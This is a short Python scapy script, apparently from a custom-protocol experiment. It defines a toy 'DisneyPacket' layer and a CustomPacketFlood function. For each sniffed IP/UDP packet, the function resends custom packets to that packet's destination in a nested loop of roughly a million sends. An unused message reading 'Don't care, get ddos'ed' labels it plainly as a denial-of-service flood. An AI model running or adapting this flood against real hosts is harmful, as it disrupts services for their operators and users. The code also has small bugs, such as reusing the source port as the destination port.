from scapy.all import Raw, send, IP, UDP
from Utils.protocol_serialization import bind_protocol
from scapy.fields import IntEnumField, ShortField, XByteField
from scapy.packet import Packet


def CustomPacketFlood(packet):


    bind_protocol([("IP", False), ("UDP", False), ("DisneyPacket", True)], {"DisneyPacket": 
    '''
    {
        "name": "DisneyPacket",
        "fields_desc": [
            {"name": "mickey", "default": 5, "fmt": "H"},
            {"name": "minnie", "default": 3, "fmt": "B"}
        ],
        "enum_fields_desc": [
            {"name": "donald", "default": 1, "enum": {"1": "happy", "2": "cool", "3": "angry"}, "fmt": "I"}
        ]
    }
    '''})

    class Disney(Packet):
        name = "DisneyPacket"
        fields_desc=[ ShortField("mickey",5),
                    XByteField("minnie",3) ,
                    IntEnumField("donald" , 1 ,
                        { 1: "happy", 2: "cool" , 3: "angry" } ) ]

    print("=== Packet Snooped ===", flush=True)
    if(IP in packet and UDP in packet):
# packet = (IP(dst="127.0.0.1") / UDP(sport=4000, dport=5000) / Raw(load=b"Waffles are better than pancakes!!!"))
        # dest = packet[IP].dst
        # souPort = packet[UDP].sport
        # desPort = packet[UDP].sport
        rawMsg = b"Don't care, get ddos'ed"
        #
        for packets in range(0,1000):
            #order matters, if the custom layer is sent after the Raw layer, scapy mixes both. Add custom layer bedore raw
            send((IP(dst=packet[IP].dst) / UDP(sport=packet[UDP].sport, dport=packet[UDP].sport)/ Disney(mickey=10, minnie=20, donald=2)), count = 1000)
    
